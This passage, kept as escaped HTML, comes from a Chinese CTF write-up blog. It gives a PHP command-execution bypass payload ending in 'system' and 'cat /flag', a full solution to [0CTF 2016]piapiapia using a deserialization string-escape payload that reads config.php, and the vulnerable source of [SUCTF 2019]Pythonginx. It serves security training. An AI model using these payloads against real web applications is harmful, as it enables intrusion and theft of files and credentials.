&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;strtoupper&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;2927671435926243&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$cos(&lt;span style="color:#e6db74"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面代码是把字符串&lt;strong&gt;strtoupper&lt;/strong&gt;赋值到变量&lt;code&gt;$cos&lt;/code&gt;，然后直接使用&lt;code&gt;$cos()&lt;/code&gt;执行&lt;code&gt;strtoupper()&lt;/code&gt;函数。代码中使用&lt;code&gt;base_convert&lt;/code&gt;函数也是这道题的一种思路哦。﹙ˊ_&amp;gt;ˋ﹚&lt;/p&gt;
&lt;p&gt;还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号&lt;code&gt;()&lt;/code&gt;括起来就可以了。&lt;code&gt;$&lt;/code&gt;如果直接拼接到字符串上也是不可以的，需要使用形如&lt;code&gt;$$cos&lt;/code&gt;才可以正确的指向变量。&lt;/p&gt;
&lt;p&gt;最终payload：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;c&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_finite&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;))&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;rad2deg&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;));$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$$cos;$cos{&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;}($cos{&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;})&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;cat&lt;/span&gt; &lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="0ctf-2016piapiapia"&gt;[0CTF 2016]piapiapia
&lt;/h1&gt;&lt;p&gt;使用目录扫描发现了www.zip网站备份。&lt;/p&gt;
&lt;p&gt;网站结构&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;static&lt;/p&gt;
&lt;p&gt;upload&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;config.php&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;profile.php&lt;/p&gt;
&lt;p&gt;register.php&lt;/p&gt;
&lt;p&gt;update.php&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;发现有register就去注册个试试呗&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210309102253.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号&lt;/p&gt;
&lt;p&gt;邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;data:image/gif;base64,.......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看源码profile.php中是这样的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$profile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($profile);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $phone &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $email &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nickname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;nickname&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $photo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base64_encode&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style="color:#e6db74"&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了&lt;code&gt;unserialize&lt;/code&gt;，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;hostname&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;database&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;del&gt;下载的源码肯定不会把flag直接给你&lt;/del&gt;，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：&lt;code&gt;filter&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$username &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($username);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$password &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($password);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟进一下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($string) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $string &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($escape, &lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($safe, &lt;span style="color:#e6db74"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤&lt;code&gt;_&lt;/code&gt;，select、insert、update、delete、where会被替换成&lt;code&gt;hacker&lt;/code&gt;，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用&lt;a class="link" href="https://my.oschina.net/u/3076320/blog/4372683" target="_blank" rel="noopener"
&gt;PHP反序列化字符串逃逸&lt;/a&gt;，序列化的结尾是&lt;code&gt;&amp;quot;;}&lt;/code&gt;可以手动构造闭合。&lt;/p&gt;
&lt;p&gt;现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工&lt;/p&gt;
&lt;p&gt;先上payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;#34;;}s:5:&amp;#34;photo&amp;#34;;s:10:&amp;#34;config.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。&lt;/p&gt;
&lt;p&gt;受到了这位师傅的博客&lt;a class="link" href="https://blog.csdn.net/weixin_44077544/article/details/102703489" target="_blank" rel="noopener"
&gt;[0CTF 2016]piapiapia&lt;/a&gt;，我尝试了下&lt;code&gt;$profile&lt;/code&gt;属性其实是一个&lt;strong&gt;关联数组&lt;/strong&gt;，是键值对形式的，并且字符串可能是嵌套起来的，形如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;a:2:{s:8:&amp;#34;nickname&amp;#34;;s:5:&amp;#34;where&amp;#34;;s:5:&amp;#34;photo&amp;#34;;s:3:&amp;#34;233&amp;#34;;}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s1&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s1);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;O&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;profile&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;{&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;56&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;a:2:{s:8:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;nickname&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:15:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;where&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:5:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;photo&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:3:&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;233&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;}&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103923.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。&lt;/p&gt;
&lt;p&gt;查看页面的图片内容&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103720.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;base64解码&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103747.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="suctf-2019pythonginx"&gt;[SUCTF 2019]Pythonginx
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310100334.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;整理一下源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getUrl&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;url&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(url)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 111&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts &lt;span style="color:#f92672"&gt;=&lt;/span&gt; list(urlsplit(url))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 222 &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; host
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; h &lt;span style="color:#f92672"&gt;in&lt;/span&gt; host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(h&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#39;idna&amp;#39;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join(newhost)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#去掉 url 中的空格&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; finalUrl &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urlunsplit(parts)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我扌 your problem? 333&amp;#34;&lt;/span&gt;
